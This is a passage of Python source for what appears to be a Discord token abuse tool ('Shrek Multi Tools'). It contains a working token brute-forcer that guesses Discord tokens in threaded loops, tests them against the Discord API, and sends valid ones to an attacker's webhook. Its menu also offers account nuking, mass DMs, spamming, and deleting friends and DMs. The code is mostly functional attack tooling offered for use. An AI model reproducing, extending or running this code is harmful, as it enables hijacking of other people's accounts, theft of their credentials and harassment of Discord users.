            CheckWebhook(webhook_url)
        try:
            threads_number = int(input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Threads Number: {Style.RESET_ALL}'))
        except ValueError:
            ErrorNumber()

        def send_webhook(embed_content):
            payload = {'embeds': [embed_content], 'username': 'Discord Token Finder', 'avatar_url': 'https://example.com/avatar.png'}
            headers = {'Content-Type': 'application/json'}
            requests.post(webhook_url, data=json.dumps(payload), headers=headers)

        def token_check_bf():
            try:
                first = OnePartToken
                second = ''.join((random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(6)))
                third = ''.join((random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(38)))
                token = f'{first}.{second}.{third}'
                response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
                if response.status_code == 200:
                    if webhook.lower() in ['y', 'yes'] and webhook_url:
                        embed_content = {'title': 'Token Valid !', 'description': f'**Token:**\n```{token}```', 'color': 3066993, 'footer': {'text': 'Discord Token Finder', 'icon_url': 'https://example.com/avatar.png'}}
                        send_webhook(embed_content)
                    success(f'Status: Valid Token: {token}')
                else:
                    warn(f'Status: Invalid Token: {token}')
            except Exception as e:
                warn(f'Status: Error Token: {token} Error: {e}')

        def request():
            threads = []
            try:
                for _ in range(int(threads_number)):
                    t = threading.Thread(target=token_check_bf)
                    t.start()
                    threads.append(t)
            except ValueError:
                ErrorNumber()
            for thread in threads:
                thread.join()

        while True:
            request()
    except Exception as e:
        warn(f'Error: {e}')

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def main_menu():
    while True:
        clear_screen()

        print(f'''
{Fore.GREEN}
    ▄▄▄█████▓ ▒█████   ██ ▄█▀ ▓█████ ███▄    █     ▄▄▄█████▓ ▒█████   ▒█████    ██▓   
    ▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒  ▓█   ▀ ██ ▀█   █     ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒ ▓██▒   
    ▒ ▓██░ ▒░▒██░  ██▒▓███▄░  ▒███  ▓██  ▀█ ██▒    ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒ ▒██░   
    ░ ▓██▓ ░ ▒██   ██░▓██ █▄  ▒▓█  ▄▓██▒  ▐▌██▒    ░ ▓██▓ ░ ▒██   ██░▒██   ██░ ▒██░   
      ▒██▒ ░ ░ ████▓▒░▒██▒ █▄▒░▒████▒██░   ▓██░      ▒██▒ ░ ░ ████▓▒░░ ████▓▒░▒░██████
      ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░░ ▒░ ░ ▒░   ▒ ▒       ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░░ ▒░▓  
        ░      ░ ▒ ▒░ ░ ░▒ ▒░░ ░ ░  ░ ░░   ░ ▒░        ░      ░ ▒ ▒░   ░ ▒ ▒░ ░░ ░ ▒  
      ░      ░ ░ ░ ▒  ░ ░░ ░     ░     ░   ░ ░       ░      ░ ░ ░ ▒  ░ ░ ░ ▒     ░ ░  
                 ░ ░  ░  ░   ░   ░           ░                  ░ ░      ░ ░  ░    ░  

''')
        print(f'    {Fore.GREEN}[{Fore.WHITE}01{Fore.GREEN}]{Fore.WHITE} Token Login            {Fore.GREEN}[{Fore.WHITE}07{Fore.GREEN}]{Fore.WHITE} Token Spammer          {Fore.GREEN}[{Fore.WHITE}13{Fore.GREEN}]{Fore.WHITE} Token House Changer')
        print(f'    {Fore.GREEN}[{Fore.WHITE}02{Fore.GREEN}]{Fore.WHITE} Token Info             {Fore.GREEN}[{Fore.WHITE}08{Fore.GREEN}]{Fore.WHITE} Token Delete Friend    {Fore.GREEN}[{Fore.WHITE}14{Fore.GREEN}]{Fore.WHITE} Token Theme Changer')
        print(f'    {Fore.GREEN}[{Fore.WHITE}03{Fore.GREEN}]{Fore.WHITE} Token Generator        {Fore.GREEN}[{Fore.WHITE}09{Fore.GREEN}]{Fore.WHITE} Token Block Friend     {Fore.GREEN}[{Fore.WHITE}15{Fore.GREEN}]{Fore.WHITE} Token Checker Advanced')
        print(f'    {Fore.GREEN}[{Fore.WHITE}04{Fore.GREEN}]{Fore.WHITE} Token Nuker            {Fore.GREEN}[{Fore.WHITE}10{Fore.GREEN}]{Fore.WHITE} Token Delete DM        {Fore.GREEN}[{Fore.WHITE}16{Fore.GREEN}]{Fore.WHITE} ID Token Bruteforce')
        print(f'    {Fore.GREEN}[{Fore.WHITE}05{Fore.GREEN}]{Fore.WHITE} Token Joiner           {Fore.GREEN}[{Fore.WHITE}11{Fore.GREEN}]{Fore.WHITE} Token Status Changer   {Fore.GREEN}[{Fore.WHITE}17{Fore.GREEN}]{Fore.WHITE} DM All')
        print(f'    {Fore.GREEN}[{Fore.WHITE}06{Fore.GREEN}]{Fore.WHITE} Token Leaver           {Fore.GREEN}[{Fore.WHITE}12{Fore.GREEN}]{Fore.WHITE} Token Language Changer {Fore.GREEN}[{Fore.WHITE}00{Fore.GREEN}]{Fore.WHITE} Quit')
        print('')

        choice = input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Your choice: {Style.RESET_ALL}').strip()
        if choice == '1':
            token_login()
        elif choice == '2':
            token = input(f"    {Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Enter the token: {Style.RESET_ALL}").strip()
            if token:
                info_dict = get_token_info(token)
                print_boxed(info_dict)
            else:
                warn("Aucun token saisi.")
            input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')
        elif choice == '3':
            token_generator()
        elif choice == '4':
            token_nuker()
        elif choice == '5':
            token_joiner()
        elif choice == '6':
            token_leaver()
        elif choice == '7':
            token_spammer()
        elif choice == '8':
            token_delete_friend()
        elif choice == '9':
            token_block_friend()
        elif choice == '10':
            token_delete_dm()
        elif choice == '11':
            token_status_changer()
        elif choice == '12':
            token_language_changer()
        elif choice == '13':
            token_house_changer()
        elif choice == '14':
            token_theme_changer()
        elif choice == '15':
            start_checker()
        elif choice == '16':
            bruteforce()
        elif choice == '17':
            token_dm_all()
        elif choice == '0':
            info('Exiting...')
            return
        else:
            warn('Invalid choice')
            input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} Press Enter to return to menu... {Style.RESET_ALL}')

def run():
    set_console_title('Token Tool | Shrek Multi Tools')
    clear_screen()
    main_menu()

if __name__ == '__main__':
    run()